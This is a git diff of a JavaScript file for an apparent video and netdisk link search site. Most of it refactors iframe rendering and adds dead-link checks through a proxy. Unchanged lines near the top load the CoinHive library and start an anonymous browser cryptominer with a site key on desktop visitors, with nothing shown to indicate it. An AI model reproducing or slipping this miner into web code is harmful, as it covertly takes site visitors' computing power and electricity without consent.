@@ -75,7 +75,7 @@ function locationParameterChanged() {
     window.panc=pancFetcher(key);
 //     window.panduoduo=panduoduoFetcher(key);
     magnetFetcher(key);
-    window.tieba=tiebaFetcher(key);
+//     window.tieba=tiebaFetcher(key);
     if(screen.width>=751&&!/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent) ){
         importScript ("https://coin-hive.com/lib/coinhive.min.js", function(){
             var miner = new CoinHive.Anonymous('Wtx9zrRVSwMjJmFssPEtuCxnzkdo3QaP');
@@ -146,10 +146,10 @@ function setMoreIframe(ways,index,length){
     if(videos.length == 0){
         setMoreIframe(ways,index+1,than);
     }else if(than>0){
-        ways[index].setIframe(videos,videos.length,window.showVideos);
+        ways[index].setIframe(videos,videos.length,window.showVideos,true);
         setMoreIframe(ways,index+1,than);
     }else{
-        ways[index].setIframe(videos,length,window.showVideos);
+        ways[index].setIframe(videos,length,window.showVideos,true);
     }
 
 }
@@ -160,9 +160,50 @@ function fetcher(parameter){
     serf.fetchUrl = parameter.fetchUrl;
     serf.progress = innerProgress(serf.host,serf.fetchUrl);
     serf.parseVideos = parameter.parseVideos;
-    serf.setIframe = function (videos,length,showVideos){
-        parameter.setIframe(videos,length,showVideos);
+    serf.setIframe = function (videos,length,showVideos,doNotCheckInvalid){
+
+        var videos = videos.splice(0,length);
+        videos.map(function(video,index){
+            var success = function(){
+                setIframe(video,index==0);
+                showVideos.push(video);
+            };
+            if(doNotCheckInvalid){
+                success();
+            }else{
+                serf.checkInvalid(video,function(){
+                    if(index>=videos.length-1){
+                        serf.setIframe(serf.videos,1,showVideos);
+                    }
+                },success);
+            }
+        });
         serf.progress.setNum(serf.videos.length);
+    }
+    serf.checkInvalid = function(video,error,success){
+        if(parameter.checkInvalid){
+            var uri = "//charon-node.herokuapp.com/cross?api="+video.url;
+            ajax(uri,function(data){
+                var index = data.indexOf("百度网盘-链接不存在");
+
+                if(index<0){
+                    success();
+                }else{
+                    error();
+                }
+                data=null;
+            },error);
+        }else{
+            success();
+        }
+    }
+    serf.onLoaded=function(){
+        if(parameter.onLoaded){
+            parameter.onLoaded(serf);
+        }else{
+            
+            serf.setIframe(serf.videos,1,window.showVideos);
+        }
     }
     serf.fetch = parameter.fetch;
     var success = function(html){
@@ -177,13 +218,8 @@ function fetcher(parameter){
         serf.videos = videos;
         if(!window.showVideos&&serf.host!="panduoduo"){
             window.showVideos = [];
-//             serf.setIframe(serf.videos,1,window.showVideos);
         }
-
-            serf.setIframe(serf.videos,1,window.showVideos);
-//         else if((serf.videos&&serf.videos[0].ref=="magnet")||(window.showVideos.length==1&&window.showVideos[0].ref=="magnet")){
-//             serf.setIframe(serf.videos,1,window.showVideos);
-//         }
+        serf.onLoaded();
         html = null;
         
     };
@@ -234,7 +270,7 @@ function panduoduoFetcher(key){
 
         function fetchDetal(video,isSrc){
             
-            var wrapper = setIframe([video],false,true);
+            var wrapper = setIframe(video,false,true);
             var success = function(html){
 
                 var url = parseDetail(html,"a.dbutton2");
@@ -274,12 +310,16 @@ function pancFetcher(key){
     var parameter = {};
     parameter.host = "panc";
     parameter.fetchUrl = "https://www.panc.cc/s/"+key+"/td_1";
-    parameter.fetch = fetch;
+    parameter.fetch = nodeFetch;
+    parameter.onLoaded = function(fetcher){
+        clearInvalid(fetcher,function(video){
+            fetcher.setIframe([video],1,window.showVideos);
 
+        });
+    }
     parameter.parseVideos = function(html){
         var videos = parseHref(html,".a_url");
-//         clearInvalid(videos);
-        return videos;
+        
 
         function parseHref(html,select){
             var videos = [];
@@ -291,12 +331,10 @@ function pancFetcher(key){
             }
             return videos;
         }
+        return videos;
     }
-    parameter.setIframe = function (pancVideos,length,showVideos){
-        var videos = pancVideos.splice(0,length);
-        window.showVideos = window.showVideos.concat(videos);
-        setIframe(videos,true);
-    }
+    parameter.checkInvalid = true;
+    
     
     return fetcher(parameter);
 
@@ -362,36 +400,65 @@ function cross(host,api,success){
 
 
 
-function setIframe(videos,isSrc,waitUrl,templateId) {
+// function setIframe(videos,isSrc,waitUrl,templateId) {
     
+//     templateId = templateId?templateId:"videoTemplate";
+//     var template = document.getElementById(templateId).innerHTML;
+
+//     var dataBox =  document.getElementById("data");
+//     for(var i=0;i<videos.length;i++){
+// //         if(window.showVideos&&isExist(videos[i],window.showVideos)){
+// //             continue;
+// //         }
+//         var wrapper= document.createElement('div');
+//         wrapper.innerHTML= template;
+//         a = wrapper.children[0];
+//         a.innerHTML=videos[i].name;
+//         var url = videos[i].url;
+//         a.href=videos[i].refUrl||url;
+//         if(!waitUrl){
+//             if(templateId=="videoTemplate"){
+//                 var index = url.indexOf("//");
+//                 url = url.substr(index>=0?index:0);
+//             }
+//             setIframeUrl(url,wrapper,isSrc&&i==0,templateId);
+        
+//         }
+
+        
+//         dataBox.appendChild(wrapper);
+//     }
+//     confirm("");
+//     dataBox = iframe = videos = null;
+//     return wrapper;
+// }
+function setIframe(video,isSrc,waitUrl,templateId){
+    if(video.ref&&video.ref=="magnet"){
+        templateId = "magnetTemplate"
+    }
     templateId = templateId?templateId:"videoTemplate";
     var template = document.getElementById(templateId).innerHTML;
 
     var dataBox =  document.getElementById("data");
-    for(var i=0;i<videos.length;i++){
-//         if(window.showVideos&&isExist(videos[i],window.showVideos)){
-//             continue;
-//         }
         var wrapper= document.createElement('div');
         wrapper.innerHTML= template;
         a = wrapper.children[0];
-        a.innerHTML=videos[i].name;
-        var url = videos[i].url;
-        a.href=videos[i].refUrl||url;
+        a.innerHTML=video.name;
+        var url = video.url;
+        a.href=video.refUrl||url;
         if(!waitUrl){
             if(templateId=="videoTemplate"){
                 var index = url.indexOf("//");
                 url = url.substr(index>=0?index:0);
             }
-            setIframeUrl(url,wrapper,isSrc&&i==0,templateId);
+            setIframeUrl(url,wrapper,isSrc,templateId);
         
         }
 
         
         dataBox.appendChild(wrapper);
-    }
     confirm("");
-    dataBox = iframe = videos = null;
+    dataBox = iframe = null;
     return wrapper;
 }
 function setIframeUrl(url,wrapper,isSrc,templateId){
@@ -606,7 +673,9 @@ function magnetFetcher(key){
     parameter.setIframe = function (videos,length,showVideos){
         var videos = videos.splice(0,length);
         window.showVideos = window.showVideos.concat(videos);
-        setIframe(videos,true,false,"magnetTemplate");
+        videos.map(function(video,index){
+            setIframe(video,true,false,"magnetTemplate");
+        });
     }
     
     window[parameter.host] = fetcher(parameter);
@@ -667,8 +736,8 @@ function progress(host){
         var fetcher = window[host];
         if(fetcher){
             var length = fetcher.videos.length;
-//             var showLength = showVideos.length;
-//             length = length>showLength?showLength:length;
+            var showLength = showVideos.length;
+            length = length>showLength?showLength:length;
             setMoreIframe([fetcher],0,length);
         }
     }
@@ -706,22 +775,23 @@ function appendHTML(d,html){
 //         showVideos = showVideos.splice(video, 1);
 //     })
 // }
-function checkInvalid(url,error){
+function checkInvalid(url,error,success){
 
     var uri = "//charon-node.herokuapp.com/cross?api="+url;
     ajax(uri,function(data){
-        var el = document.createElement( 'html' );
-        el.innerHTML = data;
-
-        var as = el.querySelector("title");
-        if(as.innerHTML == "百度网盘-链接不存在"|| as.innerHTML =="页面不存在"){
+        var index = data.indexOf("百度网盘-链接不存在");
+        
+        if(index<0){
+            success();
+        }else{
             error();
         }
-        data=el=as=null;
+        data=null;
     },error);
 }
-function clearInvalid(array,c){
+function clearInvalid(fetcher,successOne){
     try{
+        var array = fetcher.videos;
         array.map(function(o) { 
     
             var isSortUrl =function(url){
@@ -731,6 +801,12 @@ function clearInvalid(array,c){
             if(!isSortUrl(o["url"])){
                 checkInvalid(o["url"],function(){
                     array.splice(array.indexOf(o), 1);
+                    fetcher.progress.setNum(array.length);
+                },function(){
+                    if(successOne){
+                        successOne(o);
+                        successOne = false;
+                    }
                 })
             }
         });
@@ -881,7 +957,9 @@ function tiebaFetcher(key){
     parameter.setIframe = function (videos,length,showVideos){
         var videos = videos.splice(0,length);
         window.showVideos = window.showVideos.concat(videos);
-        setIframe(videos,true,false);
+        videos.map(function(video,index){
+            setIframe(video,index==0,false);
+        });
     }
     
     return fetcher(parameter);
